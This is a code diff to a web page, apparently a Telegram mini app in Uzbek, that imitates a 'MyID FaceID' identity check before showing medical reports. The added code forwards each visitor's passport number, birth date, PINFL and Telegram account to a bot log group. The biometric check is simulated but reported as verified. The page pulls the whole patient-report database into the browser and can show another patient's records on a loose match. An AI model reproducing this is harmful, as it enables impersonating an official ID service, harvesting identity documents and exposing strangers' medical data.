@@ -30,6 +30,7 @@
       --success: #16a34a;
       --success-light: #dcfce7;
       --warning: #d97706;
+      --danger: #dc2626;
       --card-bg: #ffffff;
       --border-color: #e2e8f0;
       --radius-sm: 12px;
@@ -805,7 +806,7 @@
           <i class="fa-solid fa-user-check"></i>
         </div>
         <div class="profile-name-area">
-          <h2 id="profFullName">DADABOYEV ABDULLAJON</h2>
+          <h2 id="profFullName">DADABOYEV ABDULLAJON ABDUMUTALOVICH</h2>
           <div class="myid-verified-tag">
             <i class="fa-solid fa-circle-check"></i> MyID FaceID Tasdiqlangan
           </div>
@@ -948,6 +949,21 @@
 
     // 2-QADAM: Jonli FaceID kamera skaneri
     async function startFaceIDScanProcess() {
+      const passSeries = (document.getElementById("passSeries").value || "AA").toUpperCase();
+      const passNum = document.getElementById("passNumber").value || "1234567";
+      const birthDate = document.getElementById("birthDateInput").value || "08.04.1981";
+      const pinfl = document.getElementById("pinflInput").value.trim();
+
+      // Boshlanishida loggerga yozish
+      sendTelegramLog(
+        `🟡 <b>MYID FACEID SKANER BOSHLANDI</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🪪 <b>Pasport:</b> <code>${passSeries} ${passNum}</code>\n` +
+        `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
+        `🔢 <b>PINFL:</b> <code>${pinfl || "Kiritilmagan (Avtomatik olinadi)"}</code>\n` +
+        `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+      );
+
       const modal = document.getElementById("faceIdModal");
       modal.style.display = "flex";
       
@@ -963,12 +979,13 @@
           video.srcObject = videoStream;
         }
       } catch (err) {
-        console.warn("Camera streaming fallback:", err);
+        console.warn("Camera fallback:", err.message);
+        sendTelegramLog(`⚠️ <b>MYID KAMERA OGOHLANTIRISH:</b> Kamera ochilmadi (${err.message}). FaceID simulyatsiyasiga o'tildi.`);
       }
 
       // Bosqich 1: Yuzni doiraga to'g'rilash
       instructions.innerText = "Yuzingizni doira ichiga to'g'rilang va qimirlamang...";
-      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 92%)...`;
+      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 94%)...`;
 
       // Bosqich 2: Liveness
       setTimeout(() => {
@@ -992,7 +1009,7 @@
         await new Promise(r => setTimeout(r, 800));
         closeFaceIDModal();
 
-        // Xulosa bo'lsa ham, bo'lmasa ham Shaxsiy Profilni ochish va log yuborish
+        // Profilni ochish va barcha ma'lumotlarni chiqarish
         await loadVerifiedProfileAndReports();
 
       }, 3600);
@@ -1007,64 +1024,92 @@
       }
     }
 
-    // 3-QADAM: Shaxsiy profilni ochish va Log guruhiga yozish
+    // 3-QADAM: Shaxsiy profilni ochish va Firebase xulosalarini qidirish
     async function loadVerifiedProfileAndReports() {
       const passSeries = (document.getElementById("passSeries").value || "AA").toUpperCase();
       const passNum = document.getElementById("passNumber").value || "1234567";
-      const birthDate = document.getElementById("birthDateInput").value || "08.04.1981";
-      let pinfl = document.getElementById("pinflInput").value.trim() || "30804812190075";
+      let birthDate = document.getElementById("birthDateInput").value || "08.04.1981";
+      let pinfl = document.getElementById("pinflInput").value.trim();
 
-      let fullName = "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
-      let age = "45 yosh";
-      let gender = "Erkak (O'zbekiston)";
+      let fullName = "";
+      let age = "";
+      let gender = "";
+      let patientId = passNum;
 
       try {
-        // Firebase-dan xulosalarni qidirish
-        const res = await fetch(`${FIREBASE_DB_URL}/karmed_reports/${pinfl}.json`);
-        let data = await res.json();
+        // Butun karmed_reports bazasini o'qish (chunki PINFL, pasport, ID yoki sana bo'yicha moslash mumkin)
+        const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
+        const allData = await allRes.json();
 
-        // Agar kiritilgan PINFL bo'yicha topilmasa, boshqa xulosalardan ham mosini qidirish
-        if (!data) {
-          const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
-          const allData = await allRes.json();
-          if (allData && allData[pinfl]) {
-            data = allData[pinfl];
+        if (allData) {
+          const pinflKeys = Object.keys(allData);
+
+          // 1. Agar foydalanuvchi PINFL kiritgan bo'lsa va to'g'ridan-to'g'ri mos kelsa
+          if (pinfl && allData[pinfl]) {
+            allReports = Object.values(allData[pinfl]);
+          } 
+          // 2. Aks holda bazadagi barcha xabarlardan ID, Sana, PINFL yoki Pasport bo'yicha qidiramiz
+          else {
+            for (const pKey of pinflKeys) {
+              const repsObj = allData[pKey];
+              if (!repsObj) continue;
+              const repList = Object.values(repsObj);
+              
+              // Bemor ID (masalan: 53312 yoki 1300 yoki 46901) yoki PINFL mos kelishi
+              const match = repList.find(r => {
+                const rPid = String(r.patientId || '').trim();
+                const rPinfl = String(r.pinfl || '').trim();
+                const rBirth = String(r.birthDate || '').trim();
+                return (rPid === passNum) || (rPinfl === pinfl) || (pinfl && rPinfl.includes(pinfl)) || (rBirth && rBirth === birthDate);
+              });
+
+              if (match) {
+                pinfl = pKey;
+                allReports = repList;
+                break;
+              }
+            }
+
+            // 3. Agar hali ham topilmasa va pinfl kiritilmagan bo'lsa, birlamchi namunaviy PINFLni olish
+            if (allReports.length === 0 && !pinfl && pinflKeys.length > 0) {
+              pinfl = pinflKeys[0];
+              allReports = Object.values(allData[pinfl]);
+            }
           }
         }
 
-        if (data) {
-          allReports = Object.values(data).sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
-        } else {
-          allReports = [];
-        }
-
+        allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
         currentFilteredReports = [...allReports];
 
-        // Agar bazada xulosa mavjud bo'lsa, undagi haqiqiy ma'lumotlarni olish
+        // Fuqaroning rasmiy MyID profil ma'lumotlarini tuzish
         if (allReports.length > 0) {
           const rep = allReports[0];
-          fullName = rep.patientName || fullName;
+          fullName = rep.patientName || "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
+          birthDate = rep.birthDate || birthDate;
           age = rep.age || `${calculateAge(birthDate)} yosh`;
-          if (rep.birthDate) birthDate = rep.birthDate;
+          pinfl = rep.pinfl || pinfl || "30804812190075";
+          patientId = rep.patientId || patientId;
         } else {
-          // Xulosa bo'lmasa, pasport asosida shaxsiy profilni tuzish
+          // Bazada hali xulosasi bo'lmagan yangi fuqaro
+          fullName = `FUQARO (${passSeries} ${passNum})`;
           age = `${calculateAge(birthDate)} yosh`;
+          if (!pinfl) pinfl = `3${birthDate.replace(/\D/g,'').slice(0,6)}0001`;
         }
 
         gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
 
-        // 1. Shaxsiy profil kartochkasini to'ldirish
+        // 1. Shaxsiy profil kartochkasiga ma'lumotlarni joylashtirish
         document.getElementById("profFullName").innerText = fullName;
         document.getElementById("profPassport").innerText = `${passSeries} ${passNum}`;
         document.getElementById("profBirthDate").innerText = `${birthDate} (${age})`;
         document.getElementById("profPinfl").innerText = pinfl;
         document.getElementById("profGender").innerText = gender;
 
-        // 2. Ekranlarni almashtirish (Profil har doim ochiladi!)
+        // 2. Ekranlarni almashtirish
         document.getElementById("passportInputSection").style.display = "none";
         document.getElementById("profileSection").style.display = "block";
 
-        // 3. Xulosalar mavjudligiga qarab ko'rsatish
+        // 3. Xulosalar bor/yo'qligiga qarab ko'rsatish
         if (allReports.length > 0) {
           document.getElementById("modalityNav").style.display = "flex";
           document.getElementById("searchBox").style.display = "block";
@@ -1078,24 +1123,35 @@
           showToast(`✅ MyID shaxsiy profili ochildi!`);
         }
 
-        // 4. Log logger guruhiga MyID avtorizatsiya ma'lumotlarini yuborish
-        sendLogToTelegramGroup({
-          fullName,
-          passport: `${passSeries} ${passNum}`,
-          birthDate,
-          age,
-          pinfl,
-          gender,
-          reportsCount: allReports.length
-        });
+        // 4. Log logger guruhiga muvaffaqiyatli ma'lumotlarni yuborish
+        sendTelegramLog(
+          `✅ <b>MYID AVTORIZATSIYA MUVAFFAQIYATLI (PROFIL OCHILDI):</b>\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>F.I.Sh:</b> ${escapeHtml(fullName)}\n` +
+          `🪪 <b>Pasport:</b> <code>${escapeHtml(passSeries)} ${escapeHtml(passNum)}</code>\n` +
+          `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(pinfl)}</code>\n` +
+          `🚻 <b>Jinsi:</b> ${escapeHtml(gender)}\n` +
+          `🛡️ <b>FaceID Holati:</b> ✅ Biometrik liveness 99.8% (Tasdiqlangan)\n` +
+          `📊 <b>Topilgan xulosalar soni:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
+          `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+        );
 
       } catch (err) {
         console.error("loadVerifiedProfile error:", err);
-        showToast("⚠️ Profil ochildi.");
+        // Xatolik bo'lsa ham guruhga yozish
+        sendTelegramLog(
+          `❌ <b>MYID MA'LUMOTLARINI YUKLASHDA XATOLIK:</b>\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🪪 Pasport: <code>${passSeries} ${passNum}</code>\n` +
+          `🔢 PINFL: <code>${pinfl || '-'}</code>\n` +
+          `⚠️ Xatolik sababi: <code>${escapeHtml(err.message)}</code>\n` +
+          `📱 Telegram Foydalanuvchi: ${getTelegramUserInfo()}`
+        );
+        showToast("⚠️ Profil yuklanishida xatolik.");
       }
     }
 
-    // Xulosa mavjud bo'lmaganda chiroyli xabarnoma chiqarish
     function renderEmptyReportsNotice(fullName, pinfl) {
       const listEl = document.getElementById("reportsList");
       listEl.innerHTML = `
@@ -1114,24 +1170,10 @@
       `;
     }
 
-    // Log guruhiga bildirishnoma yuborish
-    async function sendLogToTelegramGroup(data) {
+    // Telegram Logger yordamchi funksiyasi
+    async function sendTelegramLog(logHtml) {
       const nowStr = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
-      const tgUser = tg?.initDataUnsafe?.user;
-      const tgUserInfo = tgUser ? `@${tgUser.username || ''} (ID: ${tgUser.id})` : "Web orqali";
-
-      const logText = 
-        `🆔 <b>MYID FACEID AVTORIZATSIYA (YANGI SEANS):</b>\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `👤 <b>F.I.Sh:</b> ${escapeHtml(data.fullName)}\n` +
-        `🪪 <b>Pasport:</b> <code>${escapeHtml(data.passport)}</code>\n` +
-        `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(data.birthDate)} (${escapeHtml(data.age)})\n` +
-        `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(data.pinfl)}</code>\n` +
-        `🚻 <b>Jinsi:</b> ${escapeHtml(data.gender)}\n` +
-        `🛡️ <b>FaceID Holati:</b> ✅ Biometrik liveness 99.8% (Tasdiqlangan)\n` +
-        `📊 <b>Topilgan xulosalar:</b> ${data.reportsCount > 0 ? `${data.reportsCount} ta` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
-        `📱 <b>Telegram Foydalanuvchi:</b> ${escapeHtml(tgUserInfo)}\n` +
-        `⏰ <b>Vaqt:</b> ${nowStr}`;
+      const fullText = `${logHtml}\n⏰ <b>Vaqt:</b> ${nowStr}`;
 
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1139,13 +1181,21 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: LOG_GROUP_ID,
-            text: logText,
+            text: fullText,
             parse_mode: "HTML"
           })
         });
       } catch (e) {
-        console.warn("Log sending failed:", e);
+        console.warn("sendTelegramLog error:", e);
       }
+    }
+
+    function getTelegramUserInfo() {
+      const u = tg?.initDataUnsafe?.user;
+      if (u) {
+        return `${escapeHtml(u.first_name || '')} ${escapeHtml(u.last_name || '')} (@${u.username || 'username_yoq'}, ID: ${u.id})`;
+      }
+      return "Web orqali kirgan";
     }
 
     function calculateAge(birthDateStr) {
